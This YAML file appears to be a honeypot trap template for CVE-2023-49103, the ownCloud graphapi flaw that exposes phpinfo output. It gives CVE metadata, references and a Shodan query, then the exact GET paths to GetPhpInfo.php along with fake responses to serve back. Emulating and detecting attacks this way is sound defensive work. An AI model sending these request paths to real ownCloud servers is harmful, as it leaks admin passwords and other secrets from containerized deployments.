id: CVE-2023-49103
info:
  name: OwnCloud - Phpinfo Configuration
  author: ritikchaddha
  description: 'An issue was discovered in ownCloud owncloud/graphapi 0.2.x before
    0.2.1 and 0.3.x before 0.3.1. The graphapi app relies on a third-party GetPhpInfo.php
    library that provides a URL. When this URL is accessed, it reveals the configuration
    details of the PHP environment (phpinfo). This information includes all the environment
    variables of the webserver. In containerized deployments, these environment variables
    may include sensitive data such as the ownCloud admin password, mail server credentials,
    and license key. Simply disabling the graphapi app does not eliminate the vulnerability.
    Additionally, phpinfo exposes various other potentially sensitive configuration
    details that could be exploited by an attacker to gather information about the
    system.

    '
  severity: high
  reference:
  - https://github.com/creacitysec/CVE-2023-49103/blob/main/exploit.py
  - https://nvd.nist.gov/vuln/detail/CVE-2023-49103
  - https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/
  - https://www.labs.greynoise.io//grimoire/2023-11-29-owncloud-redux/
  - https://attackerkb.com/topics/G9urDj4Cg2/cve-2023-49103
  - https://www.rapid7.com/blog/post/2023/12/01/etr-cve-2023-49103-critical-information-disclosure-in-owncloud-graph-api/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2023-49103
    cwe-id: CWE-200
    epss-score: 0.51754
    epss-percentile: 0.97272
    cpe: cpe:2.3:a:owncloud:graph_api:0.2.0:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: owncloud
    product: graph_api
    shodan-query: title:"owncloud"
  tags: cve2023,cve,owncloud,phpinfo,config,kev
traps:
- request:
    method: GET
    path: /apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: PHP ExtensionPHP Versionowncloud
- request:
    method: GET
    path: /owncloud/apps/graphapi/vendor/microsoft/microsoft-graph/tests/GetPhpInfo.php/.css
    headers: null
    body: null
  response:
    status_code: 200
    headers: {}
    body: ''
